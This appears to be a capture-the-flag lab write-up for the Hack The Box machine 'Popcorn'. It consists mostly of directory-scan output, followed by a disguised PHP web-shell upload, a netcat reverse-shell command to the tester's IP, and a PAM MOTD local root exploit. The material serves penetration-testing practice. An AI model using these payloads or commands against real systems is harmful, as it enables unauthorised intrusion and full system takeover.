@@ -1,0 +1,401 @@
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# feroxbuster -u http://popcorn.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt,bak --scan-dir-listings
+                                                                                                                     
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://popcorn.htb/
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 📂  Scan Dir Listings     │ true
+ 💲  Extensions            │ [php, html, txt, bak]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+403      GET       10l       30w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET        4l       25w      177c http://popcorn.htb/
+404      GET        9l       33w      288c http://popcorn.htb/Program%20Files
+404      GET        9l       33w      292c http://popcorn.htb/Program%20Files.txt
+404      GET        9l       34w      310c http://popcorn.htb/cgi-bin/Documents%20and%20Settings.html
+404      GET        9l       34w      309c http://popcorn.htb/cgi-bin/Documents%20and%20Settings.txt
+404      GET        9l       34w      309c http://popcorn.htb/cgi-bin/Documents%20and%20Settings.bak
+404      GET        9l       33w      301c http://popcorn.htb/cgi-bin/Program%20Files.html
+404      GET        9l       33w      300c http://popcorn.htb/cgi-bin/Program%20Files.txt
+404      GET        9l       33w      300c http://popcorn.htb/cgi-bin/Program%20Files.bak
+200      GET        4l       25w      177c http://popcorn.htb/index
+200      GET        4l       25w      177c http://popcorn.htb/index.html
+404      GET        9l       33w      287c http://popcorn.htb/reports%20list
+404      GET        9l       33w      291c http://popcorn.htb/reports%20list.txt
+404      GET        9l       33w      291c http://popcorn.htb/reports%20list.bak
+301      GET        9l       28w      312c http://popcorn.htb/torrent => http://popcorn.htb/torrent/
+200      GET      656l     3113w    47440c http://popcorn.htb/test.php
+200      GET      658l     3123w    47555c http://popcorn.htb/test
+404      GET        9l       33w      300c http://popcorn.htb/cgi-bin/reports%20list.html
+404      GET        9l       33w      299c http://popcorn.htb/cgi-bin/reports%20list.txt
+404      GET        9l       33w      299c http://popcorn.htb/cgi-bin/reports%20list.bak
+404      GET        9l       34w      310c http://popcorn.htb/torrent/Documents%20and%20Settings.html
+404      GET        9l       34w      309c http://popcorn.htb/torrent/Documents%20and%20Settings.txt
+404      GET        9l       33w      300c http://popcorn.htb/torrent/Program%20Files.txt
+301      GET        9l       28w      318c http://popcorn.htb/torrent/admin => http://popcorn.htb/torrent/admin/
+404      GET        9l       34w      316c http://popcorn.htb/torrent/admin/Documents%20and%20Settings.html
+404      GET        9l       34w      315c http://popcorn.htb/torrent/admin/Documents%20and%20Settings.txt
+404      GET        9l       33w      307c http://popcorn.htb/torrent/admin/Program%20Files.html
+404      GET        9l       33w      306c http://popcorn.htb/torrent/admin/Program%20Files.txt
+200      GET       26l       63w      968c http://popcorn.htb/torrent/rss.php
+200      GET      106l      206w     2988c http://popcorn.htb/torrent/admin/admin.php
+200      GET        1l       11w      183c http://popcorn.htb/torrent/logout.php
+200      GET       16l       92w      936c http://popcorn.htb/torrent/comment
+200      GET       16l       92w      936c http://popcorn.htb/torrent/comment.php
+200      GET        0l        0w        0c http://popcorn.htb/torrent/config
+200      GET        0l        0w        0c http://popcorn.htb/torrent/config.php
+301      GET        9l       28w      316c http://popcorn.htb/torrent/css => http://popcorn.htb/torrent/css/
+200      GET      104l      237w     2054c http://popcorn.htb/torrent/css/lightbox.css
+301      GET        9l       28w      321c http://popcorn.htb/torrent/database => http://popcorn.htb/torrent/database/
+200      GET      230l     1247w     9821c http://popcorn.htb/torrent/database/th_database.sql
+200      GET        6l       14w      321c http://popcorn.htb/torrent/stylesheet.css
+200      GET        3l        9w      483c http://popcorn.htb/torrent/images/top-bg.jpg
+200      GET        0l        0w        0c http://popcorn.htb/torrent/download
+200      GET        7l       29w     3224c http://popcorn.htb/torrent/admin/images/users.jpg
+200      GET        0l        0w        0c http://popcorn.htb/torrent/download.php
+200      GET        9l       55w     4052c http://popcorn.htb/torrent/admin/images/logout.png
+200      GET       12l       32w     2978c http://popcorn.htb/torrent/admin/images/browse.jpg
+200      GET       13l       45w     4116c http://popcorn.htb/torrent/admin/images/comments.jpg
+200      GET        1l        4w       81c http://popcorn.htb/torrent/admin/index.php
+200      GET        8l       47w     3301c http://popcorn.htb/torrent/admin/images/hack.jpg
+200      GET        0l        0w        0c http://popcorn.htb/torrent/edit
+200      GET        0l        0w        0c http://popcorn.htb/torrent/edit.php
+200      GET      185l      476w     9322c http://popcorn.htb/torrent/browse
+200      GET      293l      882w    11416c http://popcorn.htb/torrent/index.php
+200      GET      106l      206w     2988c http://popcorn.htb/torrent/admin/admin
+200      GET       11l       52w     4619c http://popcorn.htb/torrent/admin/images/add%20categories.jpg
+200      GET       17l       55w     4152c http://popcorn.htb/torrent/admin/images/list%20torrents.jpg
+200      GET      185l      476w     9322c http://popcorn.htb/torrent/browse.php
+200      GET       11l       24w     1814c http://popcorn.htb/torrent/admin/images/users%20management.gif
+200      GET        9l       61w     4944c http://popcorn.htb/torrent/admin/images/dead%20torrents.jpg
+200      GET       12l       39w     4100c http://popcorn.htb/torrent/admin/images/edit%20news.jpg
+200      GET        8l       35w     3745c http://popcorn.htb/torrent/admin/images/add%20news.jpg
+200      GET       10l       47w     3170c http://popcorn.htb/torrent/admin/images/add%20subcategories.jpg
+200      GET        7l       35w     1828c http://popcorn.htb/torrent/admin/images/news%20management.gif
+200      GET        9l       51w     4132c http://popcorn.htb/torrent/admin/images/list%20categories.jpg
+200      GET       13l       61w     5012c http://popcorn.htb/torrent/admin/images/users.png
+200      GET        1l        1w      121c http://popcorn.htb/torrent/images/background.gif
+200      GET        4l       33w     1775c http://popcorn.htb/torrent/admin/images/files%20management.gif
+200      GET       12l       39w     2775c http://popcorn.htb/torrent/admin/images/ban%20users.jpg
+404      GET        9l       33w      305c http://popcorn.htb/torrent/css/Program%20Files.html
+200      GET       19l       88w     7594c http://popcorn.htb/torrent/images/link-about.png
+200      GET       18l      137w     6625c http://popcorn.htb/torrent/images/register%20user.gif
+404      GET        9l       33w      304c http://popcorn.htb/torrent/css/Program%20Files.bak
+404      GET        9l       34w      314c http://popcorn.htb/torrent/database/Documents%20and%20Settings
+404      GET        9l       34w      319c http://popcorn.htb/torrent/database/Documents%20and%20Settings.html
+404      GET        9l       34w      318c http://popcorn.htb/torrent/database/Documents%20and%20Settings.txt
+200      GET        3l        4w      211c http://popcorn.htb/torrent/health/5.gif
+200      GET        3l        4w      199c http://popcorn.htb/torrent/health/4.gif
+200      GET      134l      306w     3767c http://popcorn.htb/torrent/hide
+404      GET        9l       33w      310c http://popcorn.htb/torrent/database/Program%20Files.html
+404      GET        9l       33w      309c http://popcorn.htb/torrent/database/Program%20Files.bak
+301      GET        9l       28w      319c http://popcorn.htb/torrent/images => http://popcorn.htb/torrent/images/
+200      GET      293l      882w    11416c http://popcorn.htb/torrent/index
+200      GET        6l       34w     3691c http://popcorn.htb/torrent/images/download%20details.jpg
+200      GET        3l       13w     1627c http://popcorn.htb/torrent/images/details.png
+200      GET        5l       11w      440c http://popcorn.htb/torrent/images/button-bg.jpg
+200      GET       17l       70w     4429c http://popcorn.htb/torrent/images/link-faq.png
+200      GET       10l       59w     4133c http://popcorn.htb/torrent/images/link-development.png
+200      GET       10l       44w     3861c http://popcorn.htb/torrent/images/link-stats.png
+200      GET        6l       17w      946c http://popcorn.htb/torrent/images/leftcor.png
+200      GET       12l       78w     5360c http://popcorn.htb/torrent/images/link-news.png
+200      GET        5l       12w      732c http://popcorn.htb/torrent/images/login2.gif
+200      GET        7l       40w     2617c http://popcorn.htb/torrent/images/back.gif
+200      GET       24l       98w     3885c http://popcorn.htb/torrent/images/loading.gif
+200      GET        7l       39w     3737c http://popcorn.htb/torrent/images/login2.jpg
+200      GET       13l       65w     5137c http://popcorn.htb/torrent/images/edit.jpg
+200      GET       62l      328w    25091c http://popcorn.htb/torrent/images/feed2.png
+200      GET        2l       14w      674c http://popcorn.htb/torrent/images/page_bg.jpg
+200      GET       10l       25w     2538c http://popcorn.htb/torrent/images/search.jpg
+200      GET       12l       47w     3408c http://popcorn.htb/torrent/images/news-arrow.gif
+200      GET       10l       45w     3361c http://popcorn.htb/torrent/images/seeds.jpg
+200      GET        3l       25w     1670c http://popcorn.htb/torrent/images/closelabel.gif
+200      GET        7l       36w     1886c http://popcorn.htb/torrent/images/download.png
+200      GET       22l       65w     4944c http://popcorn.htb/torrent/images/files%20screenshot.jpg
+200      GET        6l        9w      443c http://popcorn.htb/torrent/images/orange%20bg.jpg
+200      GET       11l       58w     4049c http://popcorn.htb/torrent/images/link-upload.png
+200      GET       11l       68w     6491c http://popcorn.htb/torrent/images/globe.jpg
+301      GET        9l       28w      315c http://popcorn.htb/torrent/js => http://popcorn.htb/torrent/js/
+200      GET       18l      109w     6455c http://popcorn.htb/torrent/images/link-forum.png
+200      GET       10l       51w     4166c http://popcorn.htb/torrent/images/link-home.png
+200      GET        1l        5w       77c http://popcorn.htb/torrent/images/reg.gif
+200      GET       11l       73w     5552c http://popcorn.htb/torrent/images/statics.jpg
+200      GET       13l       66w     4332c http://popcorn.htb/torrent/images/control%20panel.gif
+200      GET        6l       26w     2087c http://popcorn.htb/torrent/images/th.png
+200      GET        1l        6w       96c http://popcorn.htb/torrent/images/regb.gif
+200      GET        4l       18w     1896c http://popcorn.htb/torrent/images/folder.png
+200      GET       66l      389w    34759c http://popcorn.htb/torrent/images/banner.jpg
+200      GET        2l        6w      371c http://popcorn.htb/torrent/images/close.gif
+200      GET        3l        8w      449c http://popcorn.htb/torrent/images/top-end.jpg
+200      GET        8l       30w     2495c http://popcorn.htb/torrent/images/rightcor.png
+200      GET        8l       48w     4023c http://popcorn.htb/torrent/images/link-browse.png
+200      GET        5l       25w     1617c http://popcorn.htb/torrent/images/feed.png
+200      GET        1l        1w       55c http://popcorn.htb/torrent/images/blank.gif
+200      GET       11l       47w     4799c http://popcorn.htb/torrent/images/green%20mark.jpg
+200      GET       87l      629w    58643c http://popcorn.htb/torrent/images/login.png
+200      GET       81l      600w    61018c http://popcorn.htb/torrent/images/logout.png
+200      GET        0l        0w     4663c http://popcorn.htb/torrent/images/logo.png
+200      GET        0l        0w    35325c http://popcorn.htb/torrent/images/updatestats.png
+200      GET        0l        0w     1084c http://popcorn.htb/torrent/images/folder2.png
+200      GET        0l        0w    12957c http://popcorn.htb/torrent/images/stats.png
+200      GET        0l        0w    35175c http://popcorn.htb/torrent/images/mytorrents.png
+200      GET        0l        0w    32762c http://popcorn.htb/torrent/images/admin.png
+200      GET        0l        0w    33698c http://popcorn.htb/torrent/images/register.png
+200      GET        0l        0w    30884c http://popcorn.htb/torrent/images/button.png
+301      GET        9l       28w      319c http://popcorn.htb/torrent/health => http://popcorn.htb/torrent/health/
+200      GET        4l        6w      195c http://popcorn.htb/torrent/health/3.gif
+200      GET        3l        4w      171c http://popcorn.htb/torrent/health/1.gif
+200      GET        3l        5w      180c http://popcorn.htb/torrent/health/2.gif
+200      GET        1l       11w      183c http://popcorn.htb/torrent/logout
+200      GET      227l      489w     8418c http://popcorn.htb/torrent/login
+200      GET      227l      489w     8418c http://popcorn.htb/torrent/login.php
+200      GET        1l        4w       81c http://popcorn.htb/torrent/admin/index
+200      GET        1l        2w      127c http://popcorn.htb/torrent/images/sidebarspace.gif
+200      GET      903l     2738w    31969c http://popcorn.htb/torrent/js/effects.js
+200      GET       45l      266w     2152c http://popcorn.htb/torrent/js/scriptaculous.js
+200      GET     1785l     4607w    47603c http://popcorn.htb/torrent/js/prototype.js
+200      GET      689l     1962w    20711c http://popcorn.htb/torrent/js/lightbox.js
+301      GET        9l       28w      316c http://popcorn.htb/torrent/lib => http://popcorn.htb/torrent/lib/
+200      GET        0l        0w        0c http://popcorn.htb/torrent/lib/getscrape.php
+200      GET        0l        0w        0c http://popcorn.htb/torrent/lib/stdlib.php
+200      GET        0l        0w        0c http://popcorn.htb/torrent/lib/webtorrent.php
+200      GET        0l        0w        0c http://popcorn.htb/torrent/lib/BEncode.php
+200      GET        0l        0w        0c http://popcorn.htb/torrent/lib/BDecode.php
+200      GET        0l        0w        0c http://popcorn.htb/torrent/lib/dblib.php
+301      GET        9l       28w      325c http://popcorn.htb/torrent/admin/images => http://popcorn.htb/torrent/admin/images/
+200      GET      138l      809w    51153c http://popcorn.htb/torrent/preview
+404      GET        9l       34w      322c http://popcorn.htb/torrent/admin/images/Documents%20and%20Settings.bak
+404      GET        9l       33w      309c http://popcorn.htb/torrent/admin/images/Program%20Files
+404      GET        9l       33w      300c http://popcorn.htb/torrent/reports%20list.html
+200      GET       26l       63w      968c http://popcorn.htb/torrent/rss
+200      GET       30l      210w     4073c http://popcorn.htb/torrent/admin/images/
+200      GET        2l        0w        4c http://popcorn.htb/torrent/secure
+200      GET        2l        0w        4c http://popcorn.htb/torrent/secure.php
+200      GET      104l      237w     2054c http://popcorn.htb/torrent/css/lightbox
+301      GET        9l       28w      319c http://popcorn.htb/torrent/readme => http://popcorn.htb/torrent/readme/
+200      GET       38l      246w     3412c http://popcorn.htb/torrent/readme/readme.html
+200      GET       63l     2053w    12333c http://popcorn.htb/torrent/readme/license.txt
+404      GET        9l       33w      301c http://popcorn.htb/torrent/admin/reports%20list
+404      GET        9l       33w      305c http://popcorn.htb/torrent/admin/reports%20list.php
+404      GET        9l       33w      305c http://popcorn.htb/torrent/admin/reports%20list.txt
+200      GET        6l       14w      321c http://popcorn.htb/torrent/stylesheet
+200      GET       12l       32w     2978c http://popcorn.htb/torrent/admin/images/browse
+404      GET        9l       33w      299c http://popcorn.htb/torrent/reports%20list.txt
+200      GET      123l      315w     2599c http://popcorn.htb/torrent/templates/colours.css
+200      GET       24l       91w      964c http://popcorn.htb/torrent/templates/login_form.php
+200      GET        4l       17w      161c http://popcorn.htb/torrent/templates/news2.php
+200      GET       48l      352w     3690c http://popcorn.htb/torrent/templates/faq.php
+200      GET        5l       13w       98c http://popcorn.htb/torrent/templates/insufficient_privileges.php
+200      GET        1l        0w        1c http://popcorn.htb/torrent/templates/form_header.php
+200      GET       37l       83w     1111c http://popcorn.htb/torrent/templates/torrents_list_date.php
+200      GET        2l       15w      143c http://popcorn.htb/torrent/templates/stats.php
+200      GET       11l      135w      850c http://popcorn.htb/torrent/templates/about.php
+200      GET        3l       15w      153c http://popcorn.htb/torrent/templates/torrents_list.php
+200      GET       21l       52w      670c http://popcorn.htb/torrent/templates/subcategories.php
+200      GET        5l       28w      247c http://popcorn.htb/torrent/templates/directory.php
+200      GET        2l       15w      153c http://popcorn.htb/torrent/templates/torrent_details.php
+200      GET       11l       50w     3064c http://popcorn.htb/torrent/thumbnail
+200      GET       68l      578w    11157c http://popcorn.htb/torrent/images/
+200      GET       13l       45w     4116c http://popcorn.htb/torrent/admin/images/comments
+200      GET        0l        0w        0c http://popcorn.htb/torrent/upload_file
+200      GET        0l        0w        0c http://popcorn.htb/torrent/upload_file.php
+301      GET        9l       28w      318c http://popcorn.htb/torrent/users => http://popcorn.htb/torrent/users/
+301      GET        9l       28w      322c http://popcorn.htb/torrent/templates => http://popcorn.htb/torrent/templates/
+302      GET        0l        0w        0c http://popcorn.htb/torrent/templates/footer.php => http://popcorn.htb/index.php
+200      GET       20l       79w      765c http://popcorn.htb/torrent/templates/report_form.php
+200      GET       11l       50w     3064c http://popcorn.htb/torrent/thumbnail.php
+200      GET      320l      669w     5205c http://popcorn.htb/torrent/templates/layout.css
+200      GET        6l       20w      120c http://popcorn.htb/torrent/templates/hack.php
+200      GET        4l       15w      144c http://popcorn.htb/torrent/templates/news.php
+200      GET        1l        4w       81c http://popcorn.htb/torrent/admin/users
+200      GET        1l        4w       81c http://popcorn.htb/torrent/admin/users.php
+301      GET        9l       28w      321c http://popcorn.htb/torrent/torrents => http://popcorn.htb/torrent/torrents/
+404      GET        9l       33w      299c http://popcorn.htb/torrent/css/reports%20list
+301      GET        9l       28w      319c http://popcorn.htb/torrent/upload => http://popcorn.htb/torrent/upload/
+404      GET        9l       33w      303c http://popcorn.htb/torrent/css/reports%20list.txt
+200      GET      297l      719w     8357c http://popcorn.htb/torrent/upload.php
+200      GET      172l     1672w    95315c http://popcorn.htb/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.png
+301      GET        9l       28w      328c http://popcorn.htb/torrent/admin/templates => http://popcorn.htb/torrent/admin/templates/
+404      GET        9l       33w      308c http://popcorn.htb/torrent/images/Program%20Files.html
+200      GET        8l       47w     3301c http://popcorn.htb/torrent/admin/images/hack
+200      GET        3l        5w      180c http://popcorn.htb/torrent/health/2
+404      GET        9l       33w      304c http://popcorn.htb/torrent/database/reports%20list
+404      GET        9l       33w      308c http://popcorn.htb/torrent/database/reports%20list.php
+404      GET        9l       33w      309c http://popcorn.htb/torrent/database/reports%20list.html
+404      GET        9l       33w      308c http://popcorn.htb/torrent/database/reports%20list.txt
+200      GET        4l        6w      195c http://popcorn.htb/torrent/health/3
+200      GET       87l      622w    60051c http://popcorn.htb/torrent/images/admin
+200      GET        3l        4w      199c http://popcorn.htb/torrent/health/4
+200      GET        3l        4w      211c http://popcorn.htb/torrent/health/5
+404      GET        9l       33w      303c http://popcorn.htb/torrent/upload/Program%20Files
+404      GET        9l       34w      317c http://popcorn.htb/torrent/health/Documents%20and%20Settings.html
+404      GET        9l       33w      307c http://popcorn.htb/torrent/upload/Program%20Files.txt
+200      GET        9l       55w     4052c http://popcorn.htb/torrent/admin/images/logout
+404      GET        9l       33w      308c http://popcorn.htb/torrent/database/reports%20list.bak
+200      GET        7l       40w     2617c http://popcorn.htb/torrent/images/back
+200      GET        1l        1w      121c http://popcorn.htb/torrent/images/background
+404      GET        9l       34w      316c http://popcorn.htb/torrent/health/Documents%20and%20Settings.txt
+404      GET        9l       33w      307c http://popcorn.htb/torrent/upload/Program%20Files.bak
+200      GET        1l        1w       55c http://popcorn.htb/torrent/images/blank
+200      GET       92l      609w    56889c http://popcorn.htb/torrent/images/button
+200      GET        2l        6w      371c http://popcorn.htb/torrent/images/close
+[####################] - 76s   144160/144160  0s      found:230     errors:783    
+🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_popcorn_htb_-1755997456.state ...
+[####################] - 76s   144160/144160  0s      found:230     errors:783    
+[####################] - 19s    23735/23735   1274/s  http://popcorn.htb/ 
+[####################] - 18s    23735/23735   1324/s  http://popcorn.htb/cgi-bin/ 
+[####################] - 47s    23735/23735   510/s   http://popcorn.htb/torrent/ 
+[####################] - 49s    23735/23735   487/s   http://popcorn.htb/torrent/admin/ 
+[###################>] - 55s    23675/23735   431/s   http://popcorn.htb/torrent/css/ 
+[###################>] - 55s    22740/23735   414/s   http://popcorn.htb/torrent/database/ 
+[#############>------] - 54s    16200/23735   299/s   http://popcorn.htb/torrent/admin/images/ 
+[#####>--------------] - 54s     6055/23735   112/s   http://popcorn.htb/torrent/images/ 
+[##>-----------------] - 51s     3465/23735   68/s    http://popcorn.htb/torrent/health/ 
+[#####>--------------] - 48s     6280/23735   130/s   http://popcorn.htb/torrent/js/ 
+[##>-----------------] - 46s     3185/23735   69/s    http://popcorn.htb/torrent/lib/ 
+[>-------------------] - 37s      215/23735   6/s     http://popcorn.htb/torrent/readme/ 
+[####>---------------] - 28s     5255/23735   189/s   http://popcorn.htb/torrent/upload/ 
+[##>-----------------] - 27s     2930/23735   108/s   http://popcorn.htb/torrent/users/ 
+[--------------------] - 0s         0/23735   -       http://popcorn.htb/test.php 
+[--------------------] - 0s         0/23735   -       http://popcorn.htb/torrent/rss.php 
+[--------------------] - 0s         0/23735   -       http://popcorn.htb/torrent/logout.php 
+[--------------------] - 0s         0/23735   -       http://popcorn.htb/torrent/css/lightbox.css 
+[--------------------] - 0s         0/23735   -       http://popcorn.htb/torrent/database/th_database.sql 
+[--------------------] - 0s         0/23735   -       http://popcorn.htb/torrent/stylesheet.css 
+[--------------------] - 0s         0/23735   -       http://popcorn.htb/torrent/images/top-bg.jpg                                                                                                                      
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+
+we can upload a malicious image through any torrent we control.
+
+cat > shell.php.png <<'PHP'
+<?php system($_GET['cmd']); ?>
+PHP
+
+we navigate to 
+http://popcorn.htb/torrent/upload/708fdefd6944c41a8f79eab2e93837e39cb2a35d.php?cmd=nc%20-e%20/bin/sh%2010.10.14.16%204444
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.6] 49011
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+
+www-data@popcorn:/home/george$ ls -la
+total 860
+drwxr-xr-x 3 george george   4096 Oct 26  2023 .
+drwxr-xr-x 3 root   root     4096 Mar 17  2017 ..
+lrwxrwxrwx 1 george george      9 Oct 26  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 george george    220 Mar 17  2017 .bash_logout
+-rw-r--r-- 1 george george   3180 Mar 17  2017 .bashrc
+drwxr-xr-x 2 george george   4096 Mar 17  2017 .cache
+-rw-r--r-- 1 george george    675 Mar 17  2017 .profile
+-rw-r--r-- 1 george george      0 Mar 17  2017 .sudo_as_admin_successful
+-rw-r--r-- 1 george george 848727 Mar 17  2017 torrenthoster.zip
+-rw-r--r-- 1 george george     33 Aug 22 20:35 user.txt
+www-data@popcorn:/home/george$ ls -lAR
+.:
+total 852
+lrwxrwxrwx 1 george george      9 Oct 26  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 george george    220 Mar 17  2017 .bash_logout
+-rw-r--r-- 1 george george   3180 Mar 17  2017 .bashrc
+drwxr-xr-x 2 george george   4096 Mar 17  2017 .cache
+-rw-r--r-- 1 george george    675 Mar 17  2017 .profile
+-rw-r--r-- 1 george george      0 Mar 17  2017 .sudo_as_admin_successful
+-rw-r--r-- 1 george george 848727 Mar 17  2017 torrenthoster.zip
+-rw-r--r-- 1 george george     33 Aug 22 20:35 user.txt
+
+./.cache:
+total 0
+-rw-r--r-- 1 george george 0 Mar 17  2017 motd.legal-displayed
+www-data@popcorn:/home/george$
+
+This motd.legal-displayed file allows us to use this exploit
+Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2)
+https://www.exploit-db.com/exploits/14339
+
+
+www-data@popcorn:/home/george$ cd /tmp
+www-data@popcorn:/tmp$ nano 14339.sh
+www-data@popcorn:/tmp$ ls -la
+total 28
+drwxrwxrwt  5 root     root     4096 Aug 23 13:56 .
+drwxr-xr-x 21 root     root     4096 Aug 22 20:35 ..
+drwxrwxrwt  2 root     root     4096 Aug 22 20:35 .ICE-unix
+drwxrwxrwt  2 root     root     4096 Aug 22 20:35 .X11-unix
+-rw-r--r--  1 www-data www-data 3056 Aug 23 13:56 14339.sh
+-rw-r--r--  1 root     root     1600 Aug 22 20:35 vgauthsvclog.txt.0
+drwx------  2 root     root     4096 Aug 22 20:35 vmware-root
+www-data@popcorn:/tmp$ chmod +x 14339.sh
+www-data@popcorn:/tmp$ ls -la
+total 28
+drwxrwxrwt  5 root     root     4096 Aug 23 13:56 .
+drwxr-xr-x 21 root     root     4096 Aug 22 20:35 ..
+drwxrwxrwt  2 root     root     4096 Aug 22 20:35 .ICE-unix
+drwxrwxrwt  2 root     root     4096 Aug 22 20:35 .X11-unix
+-rwxr-xr-x  1 www-data www-data 3056 Aug 23 13:56 14339.sh
+-rw-r--r--  1 root     root     1600 Aug 22 20:35 vgauthsvclog.txt.0
+drwx------  2 root     root     4096 Aug 22 20:35 vmware-root
+www-data@popcorn:/tmp$ ./14339.sh
+[*] Ubuntu PAM MOTD local root
+[*] SSH key set up
+[*] spawn ssh
+[+] owned: /etc/passwd
+[*] spawn ssh
+[+] owned: /etc/shadow
+[*] SSH key removed
+[+] Success! Use password toor to get root
+Password: 
+root@popcorn:/tmp# cat /root/root.txt
+...
+root@popcorn:/tmp# 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
